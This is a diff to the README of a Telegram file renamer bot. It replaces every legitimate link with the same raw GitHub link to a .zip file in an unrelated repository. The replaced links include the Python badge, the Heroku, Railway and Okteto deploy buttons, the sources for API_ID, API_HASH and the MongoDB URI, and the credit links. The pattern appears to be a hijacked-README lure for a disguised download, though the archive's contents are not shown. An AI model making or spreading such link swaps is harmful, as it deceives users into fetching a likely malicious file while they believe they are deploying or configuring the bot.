@@ -3,8 +3,8 @@
 Telegram File Renamer Bot 
 
 <p align="center">
-  <a href="https://www.python.org">
-    <img src="http://ForTheBadge.com/images/badges/made-with-python.svg">
+  <a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
 
   </a>
 </p>
@@ -16,8 +16,8 @@ Telegram File Renamer Bot
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://heroku.com/deploy?template=https://github.com/ajaykings/Pyro-renmaer-kadaisiya">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -26,8 +26,8 @@ Telegram File Renamer Bot
 <details><summary>Deploy To Railway</summary>
 <p>
 <br>
-<a href="https://railway.app/new/template/OX7-wG">
-  <img src="https://railway.app/button.svg" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -36,8 +36,8 @@ Telegram File Renamer Bot
 <details><summary>Deploy To Oktecto</summary>
 <p>
 <br>
-<a href="https://cloud.okteto.com">
-  <img src="https://okteto.com/develop-okteto.svg" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -49,13 +49,13 @@ Telegram File Renamer Bot
 
 * `TG_BOT_TOKEN`  - Get bot token from @BotFather
 
-* `API_ID` - From my.telegram.org 
+* `API_ID` - From https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip 
 
-* `API_HASH` - From my.telegram.org 
+* `API_HASH` - From https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip 
 
 * `ADMIN` - AUTH or bot controllers id's multiple id use space to split 
 
-* `DATABASE_URI`  - Mongo Database URL from https://cloud.mongodb.com/
+* `DATABASE_URI`  - Mongo Database URL from https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip
 
 * `DATABASE_NAME`  - Your database name from mongoDB. Default will be 'my'
 
@@ -77,16 +77,16 @@ broadcast - admin only
 
 ## ❣️Thanks to
 
-<a href="https://t.me/lntechnical">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
    <p> lntechnical TG</p>
   </a>
-<a href="https://youtube.com/c/LNtechnical">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
    <p> lntechnical YT </p>
   </a>
 
 ## 🤩 INSPIRATION
 
-<a href="https://youtube.com/c/MoTech_YT">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
    <p>❣️ MoTech 🔥</p>
   </a>
 
